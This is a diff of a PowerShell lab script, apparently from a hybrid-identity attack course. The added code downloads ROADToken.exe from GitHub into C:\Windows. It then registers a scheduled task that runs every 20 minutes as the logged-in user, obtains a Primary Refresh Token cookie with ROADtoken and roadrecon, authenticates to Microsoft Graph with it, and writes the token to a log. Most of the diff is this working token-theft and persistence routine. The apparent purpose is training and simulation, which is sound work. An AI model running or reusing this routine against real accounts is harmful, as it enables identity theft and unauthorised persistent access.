@@ -8,6 +8,46 @@
 .NOTES
     Ensure you have the necessary permissions to create and manage scheduled jobs.
 #>
+param (
+    [switch]$ShouldTrigger
+)
+
+$logFilePath = "C:\lab\lab4\"
+# Ensure the directory exists
+$logDirectory = [System.IO.Path]::GetDirectoryName($logFilePath)
+if (-not (Test-Path -Path $logDirectory)) {
+    New-Item -Path $logDirectory -ItemType Directory | Out-Null
+}
+
+if($ShouldTrigger)
+{
+    Start-Transcript -Path $logFilePath -Append -ErrorAction SilentlyContinue
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Write-Verbose "[$timestamp] Running recurring script block..."
+
+    Set-Location -Path ([Environment]::GetFolderPath("Desktop"))
+
+    # Get the nonce first
+    $inputString = roadrecon auth --prt-init 
+    $inputString -match "ROADtoken: (\S+)"
+    $nonce = $matches[1]
+    
+    Write-Verbose "Nonce: $nonce"
+
+    # Get a new PRT Cookie
+    $output = ROADtoken.exe $nonce
+
+    # extract using Regex object
+    $regex = [regex]'"data":\s*"([^"]+)"'
+    $match = $regex.Match($output)
+    $prtToken = $match.Groups[1].Value
+    Write-Verbose "PrtToken: $prtToken"
+
+    roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken
+
+    Stop-Transcript -ErrorAction SilentlyContinue
+    exit
+}
 
 # Check if running as administrator
 If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -15,48 +55,62 @@ If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 
-# Define the script block to be executed
-$scriptBlock = {
-    # Define the log file path
-    $logFilePath = "C:\lab\lab4\RecurringAttackSurfaceMappingScriptLog.txt"
+function Download-FileIfNotExists {
+    param (
+        [string]$url,
+        [string]$destination = "C:\Windows"
+    )
 
-    # Ensure the directory exists
-    $logDirectory = [System.IO.Path]::GetDirectoryName($logFilePath)
-    if (-not (Test-Path -Path $logDirectory)) {
-        New-Item -Path $logDirectory -ItemType Directory | Out-Null
+    # Extract the file name from the URL
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $filePath = Join-Path -Path $destination -ChildPath $fileName
+
+    # Check if the file already exists
+    if (-Not (Test-Path -Path $filePath)) {
+        try {
+            # Download the file
+            Invoke-WebRequest -Uri $url -OutFile $filePath
+            Write-Verbose "File downloaded successfully to $filePath"
+        } catch {
+            Write-Verbose "Failed to download the file: $_"
+        }
+    } else {
+        Write-Verbose "File already exists at $filePath"
     }
-    Start-Transcript -Path $using:logFilePath -Append
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Output "[$timestamp] Running recurring script block..."
 
-
-    # Get the nonce first
-    roadrecon auth --prt-init 
-
-    # Get a new PRT Cookie
-    .\ROADtoken.exe <nonce> 
-
-    # this will AUTOMATICALLY open a browser and log in as that user (!)
-    roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken 
-    <eyJh... PRT COOKIE>
-    Stop-Transcript
+    Copy-Item -Path $filePath -Destination ([Environment]::GetFolderPath("Desktop")) -ErrorAction SilentlyContinue
 }
 
-# Check if the scheduled job already exists
-$jobName = "RecurringAttackSurfaceMappingScript"
-$existingJob = Get-ScheduledJob -Name $jobName -ErrorAction SilentlyContinue
+# download the ROADtoken.exe file
+Download-FileIfNotExists -url "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-3-tokens/ROADToken.exe"
 
-if ($null -eq $existingJob) {
-    # Define the job trigger to run every 20 minutes
-    $trigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(20) -RepetitionInterval (New-TimeSpan -Minutes 20) -RepetitionDuration ([TimeSpan]::MaxValue)
+# Define the task name
+$taskName = "RecurringAttackSurfaceMappingScript"
 
-    # Register the scheduled job
-    Register-ScheduledJob -Name $jobName -ScriptBlock $scriptBlock -Trigger $trigger -MaxResultCount 1
+# Define the task trigger to run every 20 minutes
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(20) -RepetitionInterval (New-TimeSpan -Minutes 20) 
 
-    Write-Output "Scheduled job '$jobName' created to run every 20 minutes."
+# Define the task action to run the PowerShell script
+$scriptPath = $MyInvocation.MyCommand.Path.ToString()
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $scriptPath -ShouldTrigger"
+
+# Define the principal to run the task in the user context
+$principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive
+# Check if the scheduled task already exists
+$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+
+if ($null -eq $existingTask) {
+    # Register the scheduled task
+    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal
+    Write-Verbose "Scheduled task '$taskName' created to run every 20 minutes."
 } else {
-    # Update the existing job with the new script block
-    Set-ScheduledJob -Name $jobName -ScriptBlock $scriptBlock
-
-    Write-Output "Scheduled job '$jobName' already exists. Script block updated."
+    # Update the existing task with the new trigger and action
+    Set-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action
+    Write-Verbose "Scheduled task '$taskName' already exists. Task updated."
 }
+
+Write-Verbose "Scheduled task '$taskName' created to run every 20 minutes in the user context."
+
+Start-ScheduledTask -TaskName $taskName
+Write-Verbose "Scheduled task '$taskName' started."
+
